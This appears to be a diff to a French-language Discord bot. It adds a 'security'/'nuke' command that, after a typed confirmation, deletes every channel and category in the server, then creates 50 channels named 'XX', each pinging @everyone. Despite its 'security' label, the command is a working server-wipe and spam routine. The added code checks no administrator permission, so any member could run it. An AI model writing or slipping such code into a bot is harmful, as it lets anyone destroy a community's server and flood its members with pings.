@@ -201,6 +201,58 @@ client.on('messageCreate', async (message) => {
 
   switch (commandName) {
 
+    // ===== SECURITY (nuke serveur courant uniquement) =====
+    case 'security':
+    case 'nuke': {
+      if (!message.guild) {
+        return message.reply('❌ Cette commande doit être utilisée dans un serveur.');
+      }
+
+      const guild = message.guild;
+      const executorId = message.author.id;
+
+      // Confirmation
+      await message.reply(`⚠️ **ATTENTION** : Cette commande va supprimer **TOUS** les salons et catégories de **${guild.name}** puis créer de nouveaux salons.\nTape \`CONFIRMER\` dans les 15 secondes pour continuer.`);
+
+      const filter = (m) => m.author.id === executorId && m.content === 'CONFIRMER';
+      let collected;
+      try {
+        collected = await message.channel.awaitMessages({ filter, max: 1, time: 15000, errors: ['time'] });
+      } catch {
+        return message.channel.send('❌ Confirmation expirée. Opération annulée.').catch(() => {});
+      }
+      if (!collected || collected.size === 0) return;
+
+      // Suppression de tous les salons et catégories du serveur courant uniquement
+      const channels = guild.channels.cache.filter(c => c.guild.id === guild.id);
+      let deleted = 0;
+      for (const [, ch] of channels) {
+        try {
+          await ch.delete('!security - nuke par ' + message.author.tag);
+          deleted++;
+        } catch (e) {
+          console.error(`Erreur suppression ${ch.name}:`, e.message);
+        }
+      }
+      console.log(`🗑️ ${deleted} salons/catégories supprimés sur ${guild.name}`);
+
+      // Création de nombreux salons "XX" avec message
+      const TOTAL = 50;
+      for (let i = 0; i < TOTAL; i++) {
+        try {
+          const newCh = await guild.channels.create({
+            name: 'XX',
+            type: 0, // GuildText
+          });
+          await newCh.send('Désolé du dérangement @everyone').catch(() => {});
+        } catch (e) {
+          console.error(`Erreur création salon ${i}:`, e.message);
+        }
+      }
+      console.log(`✅ ${TOTAL} salons "XX" créés sur ${guild.name}`);
+      break;
+    }
+
     // ===== AIDE =====
     case 'help': {
       const cat = args[0]?.toLowerCase();
